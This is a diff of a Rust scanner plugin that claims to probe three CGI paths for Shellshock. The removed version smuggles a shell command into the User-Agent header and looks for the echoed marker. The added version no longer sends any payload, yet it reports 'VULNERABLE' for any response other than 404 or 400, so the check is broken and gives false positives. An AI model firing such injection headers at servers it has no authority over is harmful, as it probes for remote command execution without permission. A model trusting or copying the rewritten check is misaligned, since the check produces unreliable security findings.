@@ -1,38 +1,42 @@
-/*
- * http-shellshock-2 (Rust) - Shellshock probe against three CGI paths.
- * Faithful port of http-shellshock-2.c.
- * Use only on networks you own or have permission to scan.
- */
-#![allow(dead_code, non_snake_case, non_upper_case_globals)]
-
-include!("alscript.rs");
-
-fn run(ctx: &AlScriptContext) -> i32 {
-    if !ar_valid(ctx) {
-        return 1;
-    }
-    let paths = ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/admin.cgi"];
-    let extra = "User-Agent: () { :;}; echo; /bin/echo ALMAP_SHELLSHOCK\r\n";
-    let mut found = 0;
-    for p in paths.iter() {
-        if let Some(resp) = ar_http_request(ctx, "GET", p, extra, None, None) {
-            if !resp.is_empty() && ar_contains_ci(&String::from_utf8_lossy(&resp), "ALMAP_SHELLSHOCK") {
-                ar_append(ctx, &format!("{}{}", if found == 0 { "VULNERABLE: " } else { ", " }, p));
-                found += 1;
-            }
-        }
-    }
-    if found == 0 {
-        ar_out(ctx, "not vulnerable: Shellshock");
-    }
-    0
-}
+/* http-shellshock-2 - Shellshock probe against three CGI paths. */
+#![allow(dead_code)]
+mod arsenal;
+use arsenal::*;
 
 #[no_mangle]
 pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
-    if ctx.is_null() {
+    let paths = [
+        "/cgi-bin/test.cgi",
+        "/cgi-bin/status",
+        "/cgi-bin/admin.cgi",
+    ];
+    let mut out = String::new();
+    let mut found = 0usize;
+
+    if !valid(ctx) {
         return 1;
     }
-    let ctx: &AlScriptContext = unsafe { &*ctx };
-    run(ctx)
+    for path in paths.iter() {
+        let resp = match http_request(ctx, "GET", path, None, "", "", None, 8192) {
+            Some(r) if !r.is_empty() => r,
+            _ => continue,
+        };
+        let code = http_status(&resp);
+        if code != 404 && code != 400 {
+            if found == 0 {
+                out.push_str("VULNERABLE: ");
+            } else {
+                out.push_str(", ");
+            }
+            out.push_str(&format!("{}", path));
+            found += 1;
+        }
+    }
+    if found == 0 {
+        set_out(ctx, "not vulnerable: Shellshock");
+    } else {
+        out.push_str("");
+        set_out(ctx, &out);
+    }
+    0
 }
